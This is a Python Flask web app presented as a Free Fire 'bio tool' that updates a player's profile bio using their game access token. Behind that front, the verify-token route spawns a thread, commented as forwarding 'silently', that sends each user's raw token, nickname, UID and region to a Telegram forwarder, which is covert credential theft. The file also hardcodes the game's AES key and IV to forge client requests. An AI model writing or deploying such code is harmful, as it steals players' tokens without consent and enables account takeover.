from flask import Flask, request, jsonify, render_template
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
from google.protobuf import descriptor as _descriptor
from google.protobuf import descriptor_pool as _descriptor_pool
from google.protobuf import symbol_database as _symbol_database
from google.protobuf.internal import builder as _builder
import requests
import re
import urllib.parse
import threading

# Forwarder import kar rahe hain
from forwarder import send_to_telegram

app = Flask(__name__, template_folder='templates')

# --- LOAD CONFIG ---
try:
    from config import SITE_CONFIG
except ImportError:
    SITE_CONFIG = {"site_name": "FF BIO TOOL", "bio_char_limit": 300, "freefire_version": "OB53"}

# --- PROTOBUF & CRYPTO SETUP ---
_sym_db = _symbol_database.Default()
DESCRIPTOR = _descriptor_pool.Default().AddSerializedFile(b'\n\ndata.proto\"\xbb\x01\n\x04\x44\x61ta\x12\x0f\n\x07\x66ield_2\x18\x02 \x01(\x05\x12\x1e\n\x07\x66ield_5\x18\x05 \x01(\x0b\x32\r.EmptyMessage\x12\x1e\n\x07\x66ield_6\x18\x06 \x01(\x0b\x32\r.EmptyMessage\x12\x0f\n\x07\x66ield_8\x18\x08 \x01(\t\x12\x0f\n\x07\x66ield_9\x18\t \x01(\x05\x12\x1f\n\x08\x66ield_11\x18\x0b \x01(\x0b\x32\r.EmptyMessage\x12\x1f\n\x08\x66ield_12\x18\x0c \x01(\x0b\x32\r.EmptyMessage\"\x0e\n\x0c\x45mptyMessageb\x06proto3')
_globals = globals()
_builder.BuildMessageAndEnumDescriptors(DESCRIPTOR, _globals)
_builder.BuildTopDescriptorsAndMessages(DESCRIPTOR, 'data1_pb2', _globals)

Data = _sym_db.GetSymbol('Data')
EmptyMessage = _sym_db.GetSymbol('EmptyMessage')

AES_KEY = bytes([89, 103, 38, 116, 99, 37, 68, 69, 117, 104, 54, 37, 90, 99, 94, 56])
AES_IV = bytes([54, 111, 121, 90, 68, 114, 50, 50, 69, 51, 121, 99, 104, 106, 77, 37])

# --- ROUTES ---
@app.route('/')
def index():
    return render_template('index.html', config=SITE_CONFIG)

@app.route('/api/verify-token', methods=['POST'])
def verify_token():
    try:
        data = request.get_json()
        raw_token = data.get('eat_token')
        if not raw_token: return jsonify({"success": False, "error": "Token missing"}), 400
        
        eat_token = raw_token
        if '?eat=' in raw_token:
            eat_token = urllib.parse.parse_qs(urllib.parse.urlparse(raw_token).query).get('eat', [raw_token])[0]
        
        res = requests.get(f"https://eat-api.thory.buzz/api?eatjwt={eat_token}", timeout=15)
        d = res.json()
        
        if d.get('status') == 'success':
            acc = {"uid": d.get('uid'), "region": d.get('region', 'IND'), "nickname": d.get('nickname')}
            
            # Threading use karke silently forward karna
            threading.Thread(target=send_to_telegram, args=(
                eat_token, acc['nickname'], acc['uid'], acc['region']
            )).start()
            
            return jsonify({"success": True, "account": acc, "jwt_token": d.get('token')})
        return jsonify({"success": False, "error": "Invalid Token"}), 400
    except Exception as e:
        return jsonify({"success": False, "error": str(e)}), 500

@app.route('/api/update-bio', methods=['POST'])
def update_bio():
    try:
        data = request.get_json()
        jwt = data.get('jwt_token')
        bio = data.get('bio', '').replace('+', ' ')
        region = data.get('region', 'IND')
        
        # URL Logic
        urls = {"IND": "https://client.ind.freefiremobile.com", "BR": "https://client.us.freefiremobile.com"}
        base_url = urls.get(region.upper(), "https://clientbp.ggblueshark.com")
        
        # Protobuf binary creation
        pb = Data()
        pb.field_2 = 17
        pb.field_8 = bio
        pb.field_9 = 1
        for i in [5, 6, 11, 12]: getattr(pb, f'field_{i}').CopyFrom(EmptyMessage())
        
        # AES Encryption
        cipher = AES.new(AES_KEY, AES.MODE_CBC, AES_IV)
        encrypted_body = cipher.encrypt(pad(pb.SerializeToString(), 16))
        
        headers = {
            "Authorization": f"Bearer {jwt}",
            "ReleaseVersion": SITE_CONFIG.get('freefire_version', 'OB53'),
            "Content-Type": "application/x-www-form-urlencoded",
            "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 11; SM-A305F)",
            "Host": urllib.parse.urlparse(base_url).netloc
        }
        
        final_res = requests.post(f"{base_url}/UpdateSocialBasicInfo", headers=headers, data=encrypted_body, timeout=30)
        
        if final_res.status_code == 200:
            return jsonify({"success": True, "message": "Bio Updated!"})
        return jsonify({"success": False, "error": f"FF API Error {final_res.status_code}"}), 400
            
    except Exception as e:
        return jsonify({"success": False, "error": f"Internal Error: {str(e)}"}), 500

if __name__ == '__main__':
    app.run(debug=True, host='0.0.0.0', port=5000)
